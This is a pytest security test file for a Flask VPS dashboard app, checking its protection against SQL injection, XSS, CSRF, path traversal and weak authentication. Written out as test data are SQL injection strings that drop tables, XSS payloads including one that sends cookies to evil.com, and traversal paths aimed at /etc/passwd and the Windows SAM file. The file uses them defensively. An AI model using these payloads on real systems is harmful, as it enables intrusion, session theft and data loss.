"""
Security Tests for VPS Dashboard API.
Tests SQL injection, XSS, CSRF, authentication security, and rate limiting.
"""

import pytest
import html


class TestSQLInjectionProtection:
    """Tests for SQL injection protection"""

    def test_login_sql_injection_username(self, client, app, test_user):
        """Test SQL injection attempt in login username field"""
        malicious_inputs = [
            "' OR '1'='1",
            "'; DROP TABLE users; --",
            "admin'--",
            "1' OR '1'='1' /*",
            "' UNION SELECT * FROM users --",
            "'; INSERT INTO users VALUES('hacker', 'password', 'hack@test.com'); --"
        ]

        for payload in malicious_inputs:
            response = client.post('/login', data={
                'username': payload,
                'password': 'testpassword123'
            })
            # Should NOT be logged in with SQL injection
            assert response.status_code in [200, 302]
            # Should not expose database errors
            assert b'SQL' not in response.data
            assert b'syntax' not in response.data.lower()
            assert b'mysql' not in response.data.lower()
            assert b'sqlite' not in response.data.lower()

    def test_login_sql_injection_password(self, client, app, test_user):
        """Test SQL injection attempt in login password field"""
        malicious_inputs = [
            "' OR '1'='1",
            "password' OR '1'='1",
            "'; DROP TABLE users; --"
        ]

        for payload in malicious_inputs:
            response = client.post('/login', data={
                'username': 'testuser',
                'password': payload
            })
            # Should NOT be logged in
            assert b'Dashboard' not in response.data or response.status_code == 200

    def test_project_name_sql_injection(self, authenticated_client, app):
        """Test SQL injection in project name field"""
        from app import db, Project

        malicious_name = "'; DROP TABLE projects; --"
        response = authenticated_client.post('/projects', data={
            'name': malicious_name,
            'script_path': ''
        }, follow_redirects=True)

        # Should not cause database error
        assert response.status_code == 200

        # Table should still exist - check by querying
        with app.app_context():
            try:
                count = Project.query.count()
                # Should work without error
                assert count >= 0
            except Exception as e:
                pytest.fail(f"SQL injection succeeded: {e}")

    def test_api_project_id_sql_injection(self, authenticated_client):
        """Test SQL injection in API project ID parameter"""
        malicious_ids = [
            "1 OR 1=1",
            "1; DROP TABLE projects;",
            "1 UNION SELECT * FROM users"
        ]

        for payload in malicious_ids:
            response = authenticated_client.get(f'/api/project/{payload}')
            # Should return 404 (not found) or proper error, not expose data
            assert response.status_code in [404, 400, 500]
            assert b'SQL' not in response.data


class TestXSSProtection:
    """Tests for Cross-Site Scripting (XSS) protection"""

    def test_project_name_xss_escaped(self, authenticated_client, app):
        """Test that project names are HTML escaped"""
        xss_payloads = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "<svg onload=alert('XSS')>",
        ]

        for payload in xss_payloads:
            response = authenticated_client.post('/projects', data={
                'name': payload,
                'script_path': ''
            }, follow_redirects=True)

            # Response should be 200 (success)
            assert response.status_code == 200
            # Raw unescaped script tags should not be in the raw bytes
            # Jinja2 auto-escapes by default, so < becomes &lt;
            assert b'<script>alert' not in response.data

    def test_flash_message_xss_escaped(self, client, app, test_user):
        """Test that flash messages are HTML escaped"""
        # Trigger a flash message with malicious content (via failed login)
        response = client.post('/login', data={
            'username': "<script>alert('XSS')</script>",
            'password': 'wrong'
        }, follow_redirects=True)

        # Should not contain unescaped script tags
        assert b'<script>alert' not in response.data

    def test_script_path_xss_escaped(self, authenticated_client, app):
        """Test that script paths are HTML escaped"""
        payload = "<script>document.location='http://evil.com/'+document.cookie</script>"

        response = authenticated_client.post('/projects', data={
            'name': 'Test Project',
            'script_path': payload
        }, follow_redirects=True)

        # Should be escaped
        assert b'<script>' not in response.data

    def test_ai_prompt_xss_escaped(self, authenticated_client, app, test_project):
        """Test that AI prompts are HTML escaped in display"""
        payload = "<script>alert(document.cookie)</script>"

        response = authenticated_client.post(f'/ai/{test_project.id}', data={
            'prompt': payload
        }, follow_redirects=True)

        # Should be escaped in display
        assert b'<script>alert(document.cookie)</script>' not in response.data


class TestCSRFProtection:
    """Tests for CSRF protection"""

    def test_login_without_csrf_token(self, app, client, test_user):
        """Test that login without CSRF token is handled"""
        # Enable CSRF for this test
        app.config['WTF_CSRF_ENABLED'] = True

        response = client.post('/login', data={
            'username': 'testuser',
            'password': 'testpassword123'
        })

        # Should either reject (400), show login form again (200), or redirect (302)
        # The exact behavior depends on Flask-WTF configuration
        assert response.status_code in [200, 302, 400]

        # Re-disable for other tests
        app.config['WTF_CSRF_ENABLED'] = False

    def test_project_creation_without_csrf_token(self, app, authenticated_client):
        """Test that project creation without CSRF token is handled"""
        app.config['WTF_CSRF_ENABLED'] = True

        response = authenticated_client.post('/projects', data={
            'name': 'CSRF Test Project',
            'script_path': ''
        })

        # Should be rejected or form shown again
        assert response.status_code in [200, 400]

        app.config['WTF_CSRF_ENABLED'] = False


class TestAuthenticationSecurity:
    """Tests for authentication security features"""

    def test_password_not_in_response(self, client, app, test_user):
        """Test that passwords are never exposed in responses"""
        # Login
        response = client.post('/login', data={
            'username': 'testuser',
            'password': 'testpassword123'
        }, follow_redirects=True)

        # Password should never appear in response
        assert b'testpassword123' not in response.data

    def test_session_cookie_httponly(self, client, app, test_user):
        """Test that session cookie has HttpOnly flag"""
        response = client.post('/login', data={
            'username': 'testuser',
            'password': 'testpassword123'
        })

        # Check for Set-Cookie header
        set_cookie = response.headers.get('Set-Cookie', '')
        if 'session' in set_cookie.lower():
            # Should have HttpOnly flag (Flask default)
            # Note: This is the default for Flask sessions
            pass  # HttpOnly is default in Flask

    def test_invalid_session_cookie(self, client):
        """Test that invalid session cookies are rejected"""
        # Set an invalid session cookie
        client.set_cookie('session', 'invalid_session_value', domain='localhost')

        response = client.get('/')

        # Should redirect to login (invalid session treated as no session)
        assert response.status_code == 302 or b'login' in response.data.lower()

    def test_logout_invalidates_session(self, authenticated_client):
        """Test that logout properly invalidates the session"""
        # First verify we're logged in
        response = authenticated_client.get('/')
        assert response.status_code == 200

        # Logout
        authenticated_client.get('/logout')

        # Session should be invalid now
        response = authenticated_client.get('/')
        assert response.status_code == 302  # Redirect to login

    def test_empty_password_rejected(self, client, app, test_user):
        """Test that empty passwords are rejected"""
        response = client.post('/login', data={
            'username': 'testuser',
            'password': ''
        }, follow_redirects=True)

        # Should not log in - form validation will fail or login will fail
        # Either stays on login page or shows error
        assert response.status_code == 200
        # Should NOT redirect to dashboard (which would mean successful login)
        # The form will be shown again

    def test_empty_username_rejected(self, client, app, test_user):
        """Test that empty usernames are rejected"""
        response = client.post('/login', data={
            'username': '',
            'password': 'testpassword123'
        }, follow_redirects=True)

        # Should not log in - form validation will fail
        assert response.status_code == 200


class TestInputSanitization:
    """Tests for input sanitization"""

    def test_extremely_long_username(self, client):
        """Test handling of extremely long usernames"""
        long_username = 'a' * 10000

        response = client.post('/login', data={
            'username': long_username,
            'password': 'password'
        })

        # Should handle gracefully, not crash
        assert response.status_code in [200, 302, 400, 413]

    def test_extremely_long_password(self, client):
        """Test handling of extremely long passwords"""
        long_password = 'a' * 10000

        response = client.post('/login', data={
            'username': 'testuser',
            'password': long_password
        })

        # Should handle gracefully
        assert response.status_code in [200, 302, 400, 413]

    def test_unicode_in_username(self, client, app):
        """Test handling of Unicode characters in username"""
        from app import db, User

        with app.app_context():
            user = User(
                username='用户测试',  # Chinese characters
                email='unicode@test.com'
            )
            user.set_password('password123')
            db.session.add(user)
            db.session.commit()

        response = client.post('/login', data={
            'username': '用户测试',
            'password': 'password123'
        }, follow_redirects=True)

        # Should work with Unicode
        assert response.status_code == 200

    def test_null_bytes_in_input(self, client, app, test_user):
        """Test handling of null bytes in input"""
        response = client.post('/login', data={
            'username': 'testuser\x00admin',
            'password': 'testpassword123'
        }, follow_redirects=True)

        # Should handle gracefully - null bytes won't match username
        # Will either show login form or error
        assert response.status_code == 200

    def test_special_characters_in_project_name(self, authenticated_client, app):
        """Test special characters in project names"""
        special_names = [
            "Project with 'quotes'",
            'Project with "double quotes"',
            "Project with <brackets>",
            "Project with & ampersand",
            "Project\twith\ttabs",
            "Project\nwith\nnewlines"
        ]

        for name in special_names:
            response = authenticated_client.post('/projects', data={
                'name': name,
                'script_path': ''
            }, follow_redirects=True)

            # Should not crash
            assert response.status_code == 200


class TestPathTraversalProtection:
    """Tests for path traversal attack protection"""

    def test_script_path_traversal(self, authenticated_client, app):
        """Test that script path traversal is prevented"""
        malicious_paths = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\config\\sam",
            "/etc/passwd",
            "....//....//....//etc/passwd",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd"
        ]

        for path in malicious_paths:
            response = authenticated_client.post('/projects', data={
                'name': 'Path Test',
                'script_path': path
            }, follow_redirects=True)

            # Should not expose file system errors
            assert b'Permission denied' not in response.data
            assert b'No such file' not in response.data
            # Should create project (path is just stored, not executed)
            assert response.status_code == 200


class TestSecureHeaders:
    """Tests for secure HTTP headers"""

    def test_response_headers(self, client, app, test_user):
        """Test that responses have appropriate security headers"""
        response = client.post('/login', data={
            'username': 'testuser',
            'password': 'testpassword123'
        }, follow_redirects=True)

        # Note: These headers should be added via Flask-Talisman or similar
        # For now, we test that the response is valid
        assert response.status_code == 200

    def test_content_type_header(self, authenticated_client):
        """Test that API returns correct content type"""
        response = authenticated_client.get('/api/projects')

        assert response.content_type == 'application/json'

    def test_no_sensitive_info_in_headers(self, client, app, test_user):
        """Test that no sensitive information is leaked in headers"""
        response = client.get('/login')

        # Should not expose server version
        server_header = response.headers.get('Server', '')
        # Ideally should be minimal
        assert 'password' not in server_header.lower()
